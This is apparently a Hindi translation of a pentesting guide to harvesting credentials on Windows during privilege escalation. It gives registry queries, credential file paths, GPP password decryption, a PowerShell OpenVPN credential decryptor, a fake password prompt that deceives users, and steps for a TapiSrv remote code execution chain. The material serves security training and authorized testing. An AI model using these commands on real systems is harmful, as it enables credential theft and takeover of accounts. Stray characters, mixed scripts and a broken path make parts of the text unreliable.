Server configuration और backups को सख्त ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key को offline रखें और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty क्रेडेंशियल्स

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` में हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और वह कहीं और stored हो सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths की जाँच करें। इनमें से कोई भी file मिलना उसका password उजागर नहीं करता और न ही यह साबित करता है कि कोई saved credential अब भी valid है या उसके पास अधिक privileges हैं।

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत किया जा सकता है, इसलिए देखें कि उसमें कुछ दिलचस्प है या नहीं:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

अगर आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः सहेजी गई SSH key होगी। यह encrypted रूप में संग्रहीत होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

अगर `ssh-agent` service चालू नहीं है और आप चाहते हैं कि वह boot पर अपने आप शुरू हो, तो यह चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए किसी मशीन में लॉगिन करने की कोशिश की। registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM बैकअप્સ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Readable Windows Imaging (`.wim`) backup files में offline `SAM`, `SECURITY`, और `SYSTEM` hives भी हो सकते हैं। स्थानीय रूप से सुलभ backup या image directories को प्राथमिकता दें और कुछ भी extract करने से पहले image के **member names** की जाँच करें; सिर्फ `.wim` filename से यह साबित नहीं होता कि hives उपलब्ध हैं, और सामान्य `install.wim`, `boot.wim`, और recovery images अक्सर गलत संकेत होते हैं। SMB share एक अलग access path है और उसकी जाँच तभी करें जब वह share scope में हो। Microsoft की [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जो Group Policy Preferences (GPP) के ज़रिए मशीनों के समूह पर custom local administrator accounts तैनात करने की अनुमति देती थी। हालांकि, इस तरीके में सुरक्षा की गंभीर खामियाँ थीं। सबसे पहले, SYSVOL में XML फ़ाइलों के रूप में संग्रहीत Group Policy Objects (GPOs) को कोई भी domain user ऐक्सेस कर सकता था। दूसरे, इन GPPs में मौजूद पासवर्ड AES256 से एन्क्रिप्ट किए गए थे, लेकिन इस encryption के लिए इस्तेमाल की गई default key सार्वजनिक रूप से दस्तावेज़ीकृत थी, इसलिए कोई भी authenticated user इन्हें decrypt कर सकता था। इससे गंभीर जोखिम पैदा हुआ, क्योंकि उपयोगकर्ता elevated privileges हासिल कर सकते थे।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया जो locally cached GPP फ़ाइलों में ऐसे "cpassword" field को खोजता है जो खाली न हो। ऐसी फ़ाइल मिलने पर, यह function पासवर्ड decrypt करके एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location की जानकारी शामिल होती है, जिससे इस सुरक्षा vulnerability की पहचान और उसका समाधान करने में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग करना:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

credentials के साथ web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में Backup archives

सीधे served webroot में रखा पुराना ZIP backup, पिछली configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path और यह जाँचें कि archive वास्तव में HTTP पर accessible है या नहीं। Default `C:\inetpub\wwwroot` path केवल एक संभावित स्थान है। एक त्वरित local inventory में archives खोले बिना उनके नाम और sizes सूचीबद्ध किए जा सकते हैं:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

किसी archive के नाम से यह साबित नहीं होता कि उसमें कोई secret है या उससे मिली credential से अधिक privilege मिलता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग્સ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Credentials माँगें

आप हमेशा **user से उसके credentials या किसी दूसरे user के credentials दर्ज करने के लिए कह सकते हैं**, अगर आपको लगता है कि उसे वे पता हो सकते हैं (ध्यान दें कि client से सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **credentials वाले संभावित फ़ाइलनाम**

ज्ञात फ़ाइलें जिनमें पहले **passwords** clear-text या Base64 में मौजूद थे】【。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe एक्सटेंशन के बिना फ़ाइलनाम-सूची वाला संस्करण

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 डेटाबेस में आमतौर पर `.psafe3` extension का उपयोग होता है। मेल खाने वाले filename को encrypted vault का संभावित संकेत मानें; इसकी मौजूदगी से यह साबित नहीं होता कि आप इसे पढ़ सकते हैं, unlock कर सकते हैं या इसमें संग्रहीत credentials का उपयोग कर सकते हैं। ऐसी फ़ाइलें कहाँ संग्रहीत हैं, इसकी समीक्षा करते समय उपलब्ध user profiles और configured file-sharing roots जाँचें।

पढ़ी जा सकने वाली KeePass `.kdbx` फ़ाइल भी केवल encrypted vault का संकेत है। इसे unlock करने के लिए वास्तविक master password और configured key-file या account factors की आवश्यकता होती है। यदि किसी authorized review में किसी entry में LM:NT hash pair मिले, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले पुष्टि करें कि नामित account सही है और NT hash मौजूदा तथा target की NTLM service द्वारा स्वीकार किया जाता है। Vault की किसी entry से अपने-आप Administrator या SYSTEM अधिकार नहीं मिलते; remote service access, account rights और service execution का कोई अलग चरण भी उपलब्ध होना चाहिए। Inventory में vault का path और readability दर्ज होनी चाहिए, database या संग्रहीत credentials प्रिंट नहीं करने चाहिए।

प्रस्तावित सभी फ़ाइलें खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extension के बिना Search-command variant

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में credentials

आपको credentials खोजने के लिए Bin भी देखना चाहिए।

हटाए गए backups और configuration archives के साथ-साथ ऐसी files के लिए accessible Recycle Bin entries जाँचें जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो। उपयोगी `.7z`, `.zip`, या `.rar` backup कई महीने पुराना हो सकता है और उसका filename सामान्य हो सकता है। Windows मूल path और deletion time को `$I` record में तथा हटाई गई file को उससे जुड़े `$R` entry में store करता है; archive खोलने से पहले metadata और current identity की read access जाँचें। क्या दिखेगा, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing से यह साबित नहीं होता कि कोई recoverable backup मौजूद नहीं है। Archive के नाम को जाँच के संभावित उम्मीदवार के रूप में लें, इस बात के प्रमाण के रूप में नहीं कि उसमें कोई मान्य secret है।

Accessible deleted `.pfx` file **code-signing** के लिए भी एक lead हो सकती है। यदि उसमें accessible private key है, तो उस key से बदली हुई PowerShell script sign की जा सकती है; [PowerShell को private key वाले code-signing certificate की आवश्यकता होती है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules signer की identity और rule scope का मूल्यांकन करते हैं](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)। Cross-account execution के लिए current identity के पास exact script को modify करने की अनुमति होनी चाहिए, ऐसी effective rule होनी चाहिए जो script और target account के लिए resulting signature को स्वीकार करे, और कोई scheduled task या अन्य higher-privilege consumer उसे वास्तव में चलाए। केवल `.pfx` filename, certificate subject या writable script से यह chain साबित नहीं होती। Private-key material खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की समीक्षा करें।

Credential leads के लिए accessible messaging-client profile databases, notes और received files की भी समीक्षा करें। BitLocker recovery export HTML या TXT के रूप में store किया जा सकता है, कभी-कभी किसी नाम वाले backup archive के भीतर। ऐसी सामग्री किसी अलग encrypted data volume तक पहुँच दे सकती है, जिसमें पुराने backups हों; volume और archive की जाँच केवल तभी करें जब इसकी अनुमति हो। यदि backup में `NTDS.dit` शामिल है, तो offline domain credential recovery के लिए matching `SYSTEM` hive भी आवश्यक है, जैसा कि [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल file names और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई programs द्वारा सहेजे गए **passwords recover** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के भीतर

**credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको ऐसे DBs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के Passwords संग्रहीत हों।\
आपको ऐसे DBs की जाँच करनी चाहिए जहाँ **Chrome, Edge या Firefox** के Passwords संग्रहीत हों।\
ब्राउज़र का इतिहास, बुकमार्क और पसंदीदा भी जाँचें—हो सकता है कि वहाँ कुछ **Passwords संग्रहीत हों**।

मौजूदा उपयोगकर्ता के सामान्य Edge **Default** प्रोफ़ाइल के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` इसकी पैरेंट `User Data` डायरेक्टरी में होता है। [Microsoft डिफ़ॉल्ट प्रोफ़ाइल की जगह का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); कोई दूसरी प्रोफ़ाइल या `UserDataDir` policy इसकी जगह बदल सकती है। फ़ाइलों का मौजूद होना केवल credential store का सुराग है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, लागू उपयोगकर्ता का DPAPI context या अन्य अधिकृत key material उपलब्ध है, और सहेजा गया login किसी अधिक privileged account का है या नहीं। केवल path की enumeration के लिए database खोलना या decrypted Passwords प्रिंट करना आवश्यक नहीं है।

Firefox के लिए, [Mozilla दस्तावेज़ देता है](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) कि किसी प्रोफ़ाइल की `key4.db` और `logins.json` फ़ाइलें, क्रमशः key और encrypted-login फ़ाइलों की जोड़ी हैं। इनका मौजूद होना केवल एक सुराग है: जाँचें कि दोनों फ़ाइलें पढ़ी जा सकती हैं या नहीं, उनमें सहेजी गई entries मौजूद हैं या नहीं, और credentials के उपयोग योग्य होने का निष्कर्ष निकालने से पहले यह भी जाँचें कि key को Primary Password से सुरक्षित किया गया है या नहीं। यदि प्राप्त credential किसी domain account का है, तो उस account के प्रभावी group-control अधिकारों और उस group के [LAPS password पढ़ने या decrypt करने के अधिकारों](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल ब्राउज़र artifacts से administrator तक पहुँच का रास्ता साबित नहीं होता।

ब्राउज़र से Passwords निकालने के Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग languages के software components के बीच **आपसी संचार** की सुविधा देती है। हर COM component की पहचान **class ID (CLSID)** से होती है और हर component एक या अधिक interfaces के ज़रिए functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces, क्रमशः registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मिलाकर बनाई जाती है = **HKEY\CLASSES\ROOT.**

इस registry के CLSIDs के भीतर आपको child registry **InProcServer32** मिलेगी, जिसमें एक **default value** होती है जो **DLL** की ओर इंगित करती है और एक `ThreadingModel` value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![ब्राउज़र इतिहास - COM DLL Overwriting: इस registry के CLSIDs के भीतर आपको child registry InProcServer32 मिलेगी, जिसमें एक default value होती है जो DLL की ओर इंगित करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, यदि आप निष्पादित होने वाली किसी भी **DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं—यदि उस DLL को कोई दूसरा उपयोगकर्ता निष्पादित करने वाला हो।

यह जानने के लिए कि attackers persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और registry में सामान्य Password खोज**

**फ़ाइल की सामग्री खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी खास फ़ाइल नाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**कुंजी नामों और पासवर्ड के लिए registry में खोजें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin **victim** के अंदर credentials खोजने वाले हर Metasploit POST module को **स्वचालित रूप से execute करने** के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page पर बताए गए पासवर्ड वाली सभी files को अपने-आप खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) किसी system से पासवर्ड निकालने के लिए एक और बढ़िया tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई ऐसे tools के **sessions**, **usernames** और **passwords** खोजता है जो इस data को सादे टेक्स्ट में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)।

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process full access के साथ एक नई process खोलती है** (`OpenProcess()`)। वही process **कम privileges वाली एक नई process भी बनाती है** (`CreateProcess()`), **जिसे main process के सभी खुले handles विरासत में मिलते हैं**।\
फिर, अगर आपके पास **कम privileges वाली process का full access** है, तो आप `OpenProcess()` से बनाई गई **privileged process का खुला handle हासिल** कर सकते हैं और **shellcode inject** कर सकते हैं।\
[इस vulnerability का पता लगाने और इसका फायदा उठाने के तरीके की अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[विभिन्न permission levels वाले (सिर्फ full access नहीं) processes और threads के विरासत में मिले दूसरे खुले handles की जाँच और दुरुपयोग करने की अधिक विस्तृत जानकारी के लिए यह **अन्य पोस्ट पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer को सक्षम करते हैं।

Windows में **Named Pipes** नाम का एक feature है, जो अलग-अलग processes को अलग-अलग networks पर भी data share करने देता है। यह client/server architecture जैसा है, जिसमें roles को **named pipe server** और **named pipe client** कहा जाता है।

जब कोई **client** pipe के ज़रिए data भेजता है, तो pipe सेट up करने वाला **server**, **client की पहचान अपनाने** में सक्षम होता है—बशर्ते उसके पास ज़रूरी **SeImpersonate** rights हों। ऐसा **privileged process** ढूँढ़ना जो किसी ऐसे pipe के ज़रिए communication करता हो जिसकी आप नकल कर सकते हैं, **ज़्यादा privileges हासिल करने** का अवसर देता है: जब वह process आपके बनाए pipe से interact करे, तो आप उसकी पहचान अपना सकते हैं। ऐसा attack करने के निर्देशों के लिए उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकती हैं।

इसके अलावा, यह tool burp जैसे tool से **named pipe communication intercept करने** देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs ढूँढ़ने के लिए सभी pipes की सूची और जानकारी देखने देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write से RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। कोई remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को `NETWORK SERVICE` द्वारा writable किसी भी मौजूदा file में मनमाना **4-byte write** करने के लिए इस्तेमाल कर सकता है। इसके बाद Telephony admin rights हासिल करके service के रूप में कोई arbitrary DLL load की जा सकती है। पूरा flow:

- `pszDomainUser` को किसी writable मौजूदा path पर सेट करके `ClientAttach` करें → service इसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker के control वाले `InitContext` को उस handle में लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) के ज़रिए fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के अंतर्गत खुद को जोड़ें, reconnect करें, फिर किसी arbitrary DLL path के साथ `GetUIDllName` call करें, ताकि `NETWORK SERVICE` के रूप में `TSPI_providerUIIdentify` execute हो।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### Windows में execute हो सकने वाली File Extensions

यह page देखें **[https://filesec.io/](https://filesec.io/)**

### Markdown renderers के ज़रिए Protocol handler / ShellExecute का दुरुपयोग

`ShellExecuteExW` को भेजे गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और current user के रूप में attacker के control वाली files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की निगरानी**

